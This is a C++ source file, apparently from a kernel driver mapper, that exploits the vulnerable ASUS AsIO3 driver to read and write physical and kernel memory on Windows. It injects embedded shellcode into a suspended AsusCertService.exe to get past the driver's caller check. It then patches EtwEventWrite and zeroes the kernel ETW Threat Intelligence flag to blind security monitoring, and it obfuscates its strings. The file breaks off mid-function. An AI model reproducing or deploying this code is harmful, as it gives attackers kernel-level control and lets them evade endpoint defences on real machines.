#include "intel_driver.hpp"
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>
#include <algorithm>
#include <TlHelp32.h>

#include "utils.hpp"
#include "nt.hpp"

HANDLE vdrv::hDevice = 0;
ULONG64 vdrv::ntoskrnlAddr = 0;
ULONG64 vdrv::ntoskrnlPhysBase = 0;
ULONG32 vdrv::ntoskrnlImageSize = 0;
bool vdrv::runtimeReady = false;
bool vdrv::g_stubPoolReady = false;
std::vector<vdrv::StubEntry> vdrv::g_stubPool;

static uint64_t kernel_MmGetPhysicalAddress = 0;
static HANDLE g_zombieProcess = nullptr;

static unsigned char g_AsIO3Shellcode[667] = {
	0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x81, 0xEC, 0x8C, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x18, 0x00,
	0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0x40, 0x30, 0x83, 0x64, 0x24, 0x18, 0x00, 0x6A, 0x5C, 0x5A,
	0x8B, 0x40, 0x0C, 0x6A, 0x44, 0x8B, 0x40, 0x0C, 0x8B, 0x00, 0x8B, 0x70, 0x18, 0x58, 0x6A, 0x65,
	0x59, 0x6A, 0x76, 0x66, 0x89, 0x44, 0x24, 0x32, 0x58, 0x6A, 0x69, 0x5F, 0x6A, 0x63, 0x66, 0x89,
	0x44, 0x24, 0x36, 0x58, 0x6A, 0x41, 0x66, 0x89, 0x44, 0x24, 0x3A, 0x58, 0x6A, 0x73, 0x66, 0x89,
	0x4C, 0x24, 0x34, 0x66, 0x89, 0x4C, 0x24, 0x3C, 0x59, 0x6A, 0x75, 0x66, 0x89, 0x44, 0x24, 0x40,
	0x58, 0x6A, 0x67, 0x66, 0x89, 0x44, 0x24, 0x44, 0x58, 0x6A, 0x6F, 0x66, 0x89, 0x44, 0x24, 0x48,
	0x58, 0x66, 0x89, 0x44, 0x24, 0x48, 0x6A, 0x33, 0x58, 0x66, 0x89, 0x44, 0x24, 0x4A, 0x33, 0xC0,
	0x66, 0x89, 0x54, 0x24, 0x2C, 0x66, 0x89, 0x54, 0x24, 0x3A, 0xBA, 0x8E, 0x2E, 0x4C, 0xC2, 0x66,
	0x89, 0x4C, 0x24, 0x3E, 0x66, 0x89, 0x4C, 0x24, 0x42, 0x8B, 0xCE, 0x66, 0x89, 0x7C, 0x24, 0x34,
	0x66, 0x89, 0x7C, 0x24, 0x46, 0x66, 0x89, 0x44, 0x24, 0x4C, 0xE8, 0x70, 0x01, 0x00, 0x00, 0xBA,
	0x4A, 0xBC, 0xE2, 0x71, 0x89, 0x44, 0x24, 0x1C, 0x8B, 0xCE, 0xE8, 0x60, 0x01, 0x00, 0x00, 0x8B,
	0xF8, 0xBA, 0x3E, 0x67, 0x51, 0xCD, 0x8B, 0xCE, 0x89, 0x7C, 0x24, 0x50, 0xE8, 0x4E, 0x01, 0x00,
	0x00, 0xBA, 0x0A, 0xD8, 0xCC, 0x47, 0x89, 0x44, 0x24, 0x10, 0x8B, 0xCE, 0xE8, 0x3E, 0x01, 0x00,
	0x00, 0xBA, 0xE5, 0x18, 0x77, 0x54, 0x8B, 0xCE, 0x8B, 0xD8, 0xE8, 0x30, 0x01, 0x00, 0x00, 0x83,
	0x7C, 0x24, 0x1C, 0x00, 0x8B, 0xF0, 0x0F, 0x84, 0x1B, 0x01, 0x00, 0x00, 0x85, 0xFF, 0x0F, 0x84,
	0x13, 0x01, 0x00, 0x00, 0x83, 0x7C, 0x24, 0x10, 0x00, 0x0F, 0x84, 0x08, 0x01, 0x00, 0x00, 0x85,
	0xDB, 0x0F, 0x84, 0x00, 0x01, 0x00, 0x00, 0x85, 0xF6, 0x0F, 0x84, 0xF8, 0x00, 0x00, 0x00, 0x6A,
	0x18, 0x59, 0x32, 0xC0, 0x8D, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x8D, 0x44, 0x24,
	0x14, 0x33, 0xFF, 0x50, 0x6A, 0x18, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x57, 0x6A,
	0xFF, 0xFF, 0xD3, 0x85, 0xC0, 0x0F, 0x88, 0xB5, 0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0x94, 0x00,
	0x00, 0x00, 0x89, 0x44, 0x24, 0x54, 0x8D, 0x44, 0x24, 0x2C, 0x50, 0x8D, 0x44, 0x24, 0x74, 0x50,
	0xFF, 0x54, 0x24, 0x18, 0x57, 0x57, 0x57, 0x6A, 0x01, 0x57, 0x57, 0x8D, 0x84, 0x24, 0x88, 0x00,
	0x00, 0x00, 0xC7, 0x44, 0x24, 0x70, 0x18, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x78, 0x8D, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x57, 0x50, 0x8D, 0x44, 0x24, 0x78, 0x89, 0x7C, 0x24, 0x7C, 0x50,
	0x68, 0x00, 0x00, 0x00, 0xC0, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x50, 0x89, 0xBC, 0x24, 0x94, 0x00, 0x00, 0x00, 0x89, 0xBC, 0x24, 0x98,
	0x00, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x7C, 0x85, 0xC0, 0x78, 0x45, 0x6A, 0x04, 0x8D, 0x44, 0x24,
	0x18, 0x89, 0x7C, 0x24, 0x18, 0x50, 0x6A, 0x04, 0x8D, 0x44, 0x24, 0x60, 0x50, 0x68, 0x90, 0xA4,
	0x40, 0xA0, 0x8D, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x50, 0x57, 0x57, 0x57, 0xFF, 0x74, 0x24,
	0x3C, 0xFF, 0x54, 0x24, 0x44, 0x85, 0xC0, 0x78, 0x17, 0x83, 0x4C, 0x24, 0x24, 0xFF, 0xC7, 0x44,
	0x24, 0x20, 0x80, 0x3C, 0x36, 0xFE, 0x8D, 0x44, 0x24, 0x20, 0x50, 0x57, 0xFF, 0xD6, 0xEB, 0xF6,
	0x83, 0x4C, 0x24, 0x24, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0x80, 0x3C, 0x36, 0xFE, 0x8D, 0x44, 0x24,
	0x20, 0x50, 0x57, 0xFF, 0xD6, 0xEB, 0xF6, 0xCC, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x55,
	0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x57, 0x8B, 0xF9, 0x89, 0x55, 0xFC, 0x8B, 0x47, 0x3C, 0x8B,
	0x44, 0x38, 0x78, 0x03, 0xC7, 0x8B, 0x48, 0x1C, 0x8B, 0x58, 0x20, 0x03, 0xCF, 0x89, 0x4D, 0xEC,
	0x03, 0xDF, 0x8B, 0x48, 0x24, 0x8B, 0x40, 0x18, 0x03, 0xCF, 0x89, 0x4D, 0xF0, 0x33, 0xC9, 0x89,
	0x5D, 0xF4, 0x8B, 0xD1, 0x89, 0x45, 0xF8, 0x85, 0xC0, 0x74, 0x3A, 0x56, 0x8B, 0x34, 0x93, 0x8B,
	0xD9, 0x03, 0xF7, 0xEB, 0x0A, 0x0F, 0xBE, 0xC0, 0x33, 0xD8, 0xC1, 0xC3, 0x03, 0x43, 0x46, 0x8A,
	0x06, 0x84, 0xC0, 0x75, 0xF0, 0x3B, 0x5D, 0xFC, 0x74, 0x0B, 0x8B, 0x5D, 0xF4, 0x42, 0x3B, 0x55,
	0xF8, 0x72, 0xD9, 0xEB, 0x0F, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xEC, 0x0F, 0xB7, 0x04, 0x50, 0x8B,
	0x0C, 0x81, 0x03, 0xCF, 0x5E, 0x5F, 0x8B, 0xC1, 0x5B, 0xC9, 0xC3
};

static bool FindAsusCertService(wchar_t* outPath, size_t maxLen) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32W pe = {};
		pe.dwSize = sizeof(pe);
		if (Process32FirstW(hSnap, &pe)) {
			do {
				if (_wcsicmp(pe.szExeFile, L"AsusCertService.exe") == 0) {
					HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
					if (hProc) {
						DWORD sz = (DWORD)maxLen;
						if (QueryFullProcessImageNameW(hProc, 0, outPath, &sz)) {
							CloseHandle(hProc);
							CloseHandle(hSnap);
							return true;
						}
						CloseHandle(hProc);
					}
				}
			} while (Process32NextW(hSnap, &pe));
		}
		CloseHandle(hSnap);
	}

	static const wchar_t* searchDirs[] = {
		L"C:\\Program Files (x86)\\ASUS\\ArmouryCrate.UserSessionHelper",
		L"C:\\Program Files (x86)\\ASUS\\AXSP",
		L"C:\\Program Files\\ASUS\\ARMOURY CRATE Service",
		L"C:\\Program Files (x86)\\ASUS\\ArmouryCrate Service",
		L"C:\\Program Files\\ASUS\\ArmouryCrate.UserSessionHelper",
	};

	for (const auto& dir : searchDirs) {
		std::wstring candidate = std::wstring(dir) + L"\\AsusCertService.exe";
		if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES) {
			wcsncpy_s(outPath, maxLen, candidate.c_str(), _TRUNCATE);
			return true;
		}
	}

	for (const auto& dir : searchDirs) {
		std::wstring searchPath = std::wstring(dir);
		WIN32_FIND_DATAW fd = {};
		HANDLE hFind = FindFirstFileW((searchPath + L"\\*").c_str(), &fd);
		if (hFind == INVALID_HANDLE_VALUE) continue;
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
			if (fd.cFileName[0] == L'.') continue;
			std::wstring sub = searchPath + L"\\" + fd.cFileName + L"\\AsusCertService.exe";
			if (GetFileAttributesW(sub.c_str()) != INVALID_FILE_ATTRIBUTES) {
				wcsncpy_s(outPath, maxLen, sub.c_str(), _TRUNCATE);
				FindClose(hFind);
				return true;
			}
		} while (FindNextFileW(hFind, &fd));
		FindClose(hFind);
	}

	return false;
}

static bool InjectShellcodeAndRegister(const wchar_t* exePath, HANDLE* outZombie) {
	*outZombie = nullptr;

	BYTE headers[4096];
	{
		HANDLE hFile = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
		if (hFile == INVALID_HANDLE_VALUE) return false;
		DWORD rd = 0;
		ReadFile(hFile, headers, sizeof(headers), &rd, nullptr);
		CloseHandle(hFile);
		if (rd < sizeof(IMAGE_DOS_HEADER)) return false;
	}

	auto dos = (PIMAGE_DOS_HEADER)headers;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
	auto nt32 = (PIMAGE_NT_HEADERS32)(headers + dos->e_lfanew);
	if (nt32->Signature != IMAGE_NT_SIGNATURE) return false;
	if (nt32->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) return false;

	DWORD entryRva = nt32->OptionalHeader.AddressOfEntryPoint;

	STARTUPINFOW si = {};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {};

	wchar_t cmdLine[MAX_PATH + 4];
	wcscpy_s(cmdLine, exePath);

	if (!CreateProcessW(exePath, cmdLine, nullptr, nullptr, FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
		return false;

	typedef NTSTATUS(NTAPI* tNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
	auto pNtQIP = (tNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (!pNtQIP) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return false;
	}

	ULONG_PTR wow64Peb = 0;
	pNtQIP(pi.hProcess, 26, &wow64Peb, sizeof(wow64Peb), nullptr);

	DWORD actualBase = 0;
	if (wow64Peb) {
		ReadProcessMemory(pi.hProcess, (PVOID)(wow64Peb + 0x08), &actualBase, sizeof(actualBase), nullptr);
	}

	if (!actualBase)
		actualBase = nt32->OptionalHeader.ImageBase;

	DWORD entryAddr = actualBase + entryRva;

	DWORD oldProt = 0;
	VirtualProtectEx(pi.hProcess, (LPVOID)(ULONG_PTR)entryAddr, sizeof(g_AsIO3Shellcode), PAGE_EXECUTE_READWRITE, &oldProt);
	SIZE_T written = 0;
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ULONG_PTR)entryAddr, g_AsIO3Shellcode, sizeof(g_AsIO3Shellcode), &written) ||
		written != sizeof(g_AsIO3Shellcode)) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return false;
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);

	*outZombie = pi.hProcess;
	return true;
}

static HANDLE OpenAsIO3Device() {
	auto devName = ENC("\\\\.\\Asusgio3");
	return CreateFileA(devName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
}

static bool BypassAsIO3Auth() {
	wchar_t exePath[MAX_PATH] = {};
	if (!FindAsusCertService(exePath, MAX_PATH))
		return false;

	HANDLE zombie = nullptr;
	if (!InjectShellcodeAndRegister(exePath, &zombie))
		return false;

	g_zombieProcess = zombie;
	Sleep(3000);
	return true;
}

bool vdrv::IsRunning() {
	HANDLE h = OpenAsIO3Device();
	if (h && h != INVALID_HANDLE_VALUE) {
		CloseHandle(h);
		return true;
	}
	return false;
}

bool vdrv::PopulateStubPool() {
	if (g_stubPoolReady)
		return !g_stubPool.empty();

	std::vector<std::string> candidates = {
		ENC("NtTraceControl"),
		ENC("NtQueryDebugFilterState"),
		ENC("NtSetDebugFilterState"),
		ENC("NtFlushBuffersFileEx"),
		ENC("NtAccessCheckByTypeAndAuditAlarm"),
		ENC("NtAddAtom"),
		ENC("NtGetCurrentProcessorNumber"),
		ENC("NtQueryEvent"),
		ENC("NtFlushVirtualMemory"),
		ENC("NtEnumerateKey"),
		ENC("NtQueryDirectoryObject"),
		ENC("NtPrivilegeCheck"),
		ENC("NtEnumerateValueKey"),
		ENC("NtQueryQuotaInformationFile"),
		ENC("NtFlushKey"),
		ENC("NtQueryFullAttributesFile"),
		ENC("NtOpenKeyEx"),
		ENC("NtQueryVolumeInformationFile"),
		ENC("NtNotifyChangeKey"),
		ENC("NtFlushInstructionCache"),
		ENC("NtGetTickCount"),
		ENC("NtQueryTimerResolution"),
		ENC("NtDeleteValueKey"),
		ENC("NtLockFile"),
	};

	for (size_t i = candidates.size() - 1; i > 0; i--) {
		size_t j = kdmUtils::CryptoRand32() % (i + 1);
		std::swap(candidates[i], candidates[j]);
	}

	size_t target_count = 4 + (kdmUtils::CryptoRand32() % 4);
	for (size_t i = 0; i < candidates.size() && g_stubPool.size() < target_count; i++) {
		uint64_t addr = GetKernelModuleExport(ntoskrnlAddr, candidates[i]);
		if (!addr)
			continue;
		uint8_t probe[16] = { 0 };
		if (!ReadMemory(addr, probe, sizeof(probe)))
			continue;
		if (probe[0] == 0x48 && probe[1] == 0xb8 && probe[10] == 0xff && probe[11] == 0xe0)
			continue;
		if (probe[0] == 0xe9 || probe[0] == 0xeb)
			continue;
		g_stubPool.push_back({ addr, candidates[i] });
	}

	g_stubPoolReady = true;
	return !g_stubPool.empty();
}

bool vdrv::PickStub(uint64_t& out_kaddr, std::string& out_name) {
	if (g_stubPool.empty())
		return false;
	size_t idx = kdmUtils::CryptoRand32() % g_stubPool.size();
	out_kaddr = g_stubPool[idx].kaddr;
	out_name = g_stubPool[idx].name;
	return true;
}

NTSTATUS vdrv::AcquireDebugPrivilege() {
	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	return nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
}

static uint8_t g_EtwOriginalBytes[8] = { 0 };
static void* g_EtwPatchAddr = nullptr;
static bool g_EtwPatched = false;

static bool PatchUsermodeEtw() {
	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
	if (!ntdll)
		return false;

	auto etwName = ENC("EtwEventWrite");
	g_EtwPatchAddr = reinterpret_cast<void*>(GetProcAddress(ntdll, etwName.c_str()));
	if (!g_EtwPatchAddr)
		return false;

	memcpy(g_EtwOriginalBytes, g_EtwPatchAddr, sizeof(g_EtwOriginalBytes));

	DWORD oldProt = 0;
	if (!VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt))
		return false;

	uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
	memcpy(g_EtwPatchAddr, patch, sizeof(patch));

	VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
	g_EtwPatched = true;
	return true;
}

static void RestoreUsermodeEtw() {
	if (!g_EtwPatched || !g_EtwPatchAddr)
		return;

	DWORD oldProt = 0;
	if (VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt)) {
		memcpy(g_EtwPatchAddr, g_EtwOriginalBytes, sizeof(g_EtwOriginalBytes));
		VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
	}

	g_EtwPatched = false;
}

static uint64_t g_etwTiEnableOffset = 0;
static uint32_t g_etwTiOriginalValue = 0;
static bool     g_etwTiWasDisabled = false;

static bool DisableKernelEtwTi() {
	if (!vdrv::runtimeReady)
		return false;

	BYTE guidSig[] = {
		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
	};
	char guidMask[] = "xxxxxxxxxxxxxxxx";

	uintptr_t guidAddr = vdrv::FindPatternInSectionAtKernel(
		".data", vdrv::ntoskrnlAddr, guidSig, guidMask);

	if (!guidAddr) {
		guidAddr = vdrv::FindPatternInSectionAtKernel(
			".rdata", vdrv::ntoskrnlAddr, guidSig, guidMask);
	}

	if (!guidAddr)
		return false;

	uint64_t provRegHandle = guidAddr - 0x20;
	uint64_t enableOffset = provRegHandle + 0x30;

	uint32_t enableInfo = 0;
	if (!vdrv::ReadMemory(enableOffset, &enableInfo, sizeof(enableInfo)))
		return false;

	if (enableInfo == 0)
		return true;

	g_etwTiEnableOffset = enableOffset;
	g_etwTiOriginalValue = enableInfo;
	g_etwTiWasDisabled = true;

	uint32_t zero = 0;
	if (!vdrv::WriteMemory(enableOffset, &zero, sizeof(zero))) {
		g_etwTiWasDisabled = false;
		return false;
	}

	return true;
}

static bool RestoreKernelEtwTi() {
	if (!g_etwTiWasDisabled || !g_etwTiEnableOffset || !vdrv::runtimeReady)
		return false;

	bool ok = vdrv::WriteMemory(g_etwTiEnableOffset, &g_etwTiOriginalValue, sizeof(g_etwTiOriginalValue));

	g_etwTiWasDisabled = false;
	g_etwTiEnableOffset = 0;
	g_etwTiOriginalValue = 0;

	return ok;
}

bool vdrv::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);

		WINIO_PHYSICAL_MEMORY_INFO request = {};
		request.ViewSize = chunk;
		request.BusAddress = physical_address + offset;

		DWORD bytes_returned = 0;
		if (!DeviceIoControl(hDevice, IOCTL_ASUSIO_MAP,
			&request, sizeof(request),
			&request, sizeof(request),
			&bytes_returned, nullptr))
			return false;

		if (!request.BaseAddress)
			return false;

		memcpy((uint8_t*)buffer + offset, request.BaseAddress, chunk);

		WINIO_PHYSICAL_MEMORY_INFO unmap = {};
		unmap.BaseAddress = request.BaseAddress;
		unmap.SectionHandle = request.SectionHandle;
		unmap.ReferencedObject = request.ReferencedObject;

		DeviceIoControl(hDevice, IOCTL_ASUSIO_UNMAP,
			&unmap, sizeof(unmap),
			&unmap, sizeof(unmap),
			&bytes_returned, nullptr);

		offset += chunk;
	}
	return true;
}

bool vdrv::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size) {
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);

		WINIO_PHYSICAL_MEMORY_INFO request = {};
		request.ViewSize = chunk;
		request.BusAddress = physical_address + offset;

		DWORD bytes_returned = 0;
		if (!DeviceIoControl(hDevice, IOCTL_ASUSIO_MAP,
			&request, sizeof(request),
			&request, sizeof(request),
			&bytes_returned, nullptr))
			return false;

		if (!request.BaseAddress)
			return false;

		memcpy(request.BaseAddress, (const uint8_t*)buffer + offset, chunk);

		WINIO_PHYSICAL_MEMORY_INFO unmap = {};
		unmap.BaseAddress = request.BaseAddress;
		unmap.SectionHandle = request.SectionHandle;
		unmap.ReferencedObject = request.ReferencedObject;

		DeviceIoControl(hDevice, IOCTL_ASUSIO_UNMAP,
			&unmap, sizeof(unmap),
			&unmap, sizeof(unmap),
			&bytes_returned, nullptr);

		offset += chunk;
	}
	return true;
}

bool vdrv::ScanForNtoskrnlPhysBase() {
	if (!ntoskrnlAddr)
		return false;

	ULONG bufferSize = 0;
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, nullptr, 0, &bufferSize);
	if (!bufferSize)
		return false;

	auto modInfo = std::make_unique<uint8_t[]>(bufferSize);
	if (!NT_SUCCESS(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, modInfo.get(), bufferSize, &bufferSize)))
		return false;

	auto modules = reinterpret_cast<nt::PRTL_PROCESS_MODULES>(modInfo.get());
	for (ULONG i = 0; i < modules->NumberOfModules; i++) {
		if ((uint64_t)modules->Modules[i].ImageBase == ntoskrnlAddr) {
			ntoskrnlImageSize = modules->Modules[i].ImageSize;
			break;
		}
	}

	if (!ntoskrnlImageSize)
		return false;

	const uint64_t LARGE_PAGE = 0x200000;
	const uint64_t MAX_SCAN = 0x80000000ULL;

	uint8_t header_buf[0x1000];

	for (uint64_t pa = 0; pa < MAX_SCAN; pa += LARGE_PAGE) {
		if (!PhysicalRead(pa, header_buf, sizeof(header_buf)))
			continue;

		auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(header_buf);
		if (dos->e_magic != IMAGE_DOS_SIGNATURE)
			continue;

		if (dos->e_lfanew <= 0 || (ULONG)dos->e_lfanew >= 0x800)
			continue;

		auto nt_hdr = reinterpret_cast<PIMAGE_NT_HEADERS64>(header_buf + dos->e_lfanew);
		if (nt_hdr->Signature != IMAGE_NT_SIGNATURE)
			continue;

		if (nt_hdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
			continue;

		if (nt_hdr->OptionalHeader.SizeOfImage != ntoskrnlImageSize)
			continue;

		auto exportDir = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
		if (!exportDir.VirtualAddress || !exportDir.Size)
			continue;

		ntoskrnlPhysBase = pa;
		return true;
	}

	return false;
}

bool vdrv::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
		return PhysicalRead(pa, buffer, size);
	}

	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint64_t current_va = address + offset;
		uint64_t page_offset = current_va & 0xFFF;
		uint64_t chunk = size - offset;
		if (chunk > 0x1000 - page_offset)
			chunk = 0x1000 - page_offset;

		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
			return false;

		if (!pa_result.QuadPart)
			return false;

		if (!PhysicalRead(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
			return false;

		offset += chunk;
	}
	return true;
}

bool vdrv::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
		return PhysicalWrite(pa, buffer, size);
	}

	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint64_t current_va = address + offset;
		uint64_t page_offset = current_va & 0xFFF;
		uint64_t chunk = size - offset;
		if (chunk > 0x1000 - page_offset)
			chunk = 0x1000 - page_offset;

		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
			return false;

		if (!pa_result.QuadPart)
			return false;

		if (!PhysicalWrite(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
			return false;

		offset += chunk;
	}
	return true;
}

bool vdrv::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address < ntoskrnlAddr + ntoskrnlImageSize) {
		physical_address = ntoskrnlPhysBase + (address - ntoskrnlAddr);
	}
	else if (runtimeReady && kernel_MmGetPhysicalAddress) {
		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, address))
			return false;
		physical_address = pa_result.QuadPart;
	}
	else {
		return false;
	}

	if (!physical_address)
		return false;

	return PhysicalWrite(physical_address, buffer, size);
}

NTSTATUS vdrv::Load() {
	if (kdmUtils::IsHvciWithBlocklistActive())
		return STATUS_ACCESS_DENIED;

	auto status = AcquireDebugPrivilege();
	if (!NT_SUCCESS(status))
		return status;

	PatchUsermodeEtw();

	hDevice = OpenAsIO3Device();

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
		if (!BypassAsIO3Auth()) {
			RestoreUsermodeEtw();
			return STATUS_DEVICE_NOT_CONNECTED;
		}
		hDevice = OpenAsIO3Device();
		if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
			RestoreUsermodeEtw();
			return STATUS_DEVICE_NOT_CONNECTED;
		}
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
	if (ntoskrnlAddr == 0) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	if (!ScanForNtoskrnlPhysBase()) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_NOT_FOUND;
	}

	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
	if (!kernel_MmGetPhysicalAddress) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	runtimeReady = true;

	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!vdrv::ReadMemory(vdrv::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		RestoreUsermodeEtw();
		vdrv::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	PopulateStubPool();

	vdrv::ScopedPriorityBoost _boost;

	DisableKernelEtwTi();

	RestoreUsermodeEtw();

	return STATUS_SUCCESS;
}

NTSTATUS vdrv::Unload() {
	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		RestoreKernelEtwTi();
	}

	runtimeReady = false;
	kernel_MmGetPhysicalAddress = 0;
	ntoskrnlPhysBase = 0;
	ntoskrnlImageSize = 0;

	g_stubPool.clear();
	g_stubPoolReady = false;
	g_section_cache.clear();

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
		CloseHandle(hDevice);
	hDevice = 0;

	if (g_zombieProcess) {
		TerminateProcess(g_zombieProcess, 0);
		CloseHandle(g_zombieProcess);
		g_zombieProcess = nullptr;
	}

	return STATUS_SUCCESS;
}

uint64_t vdrv::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
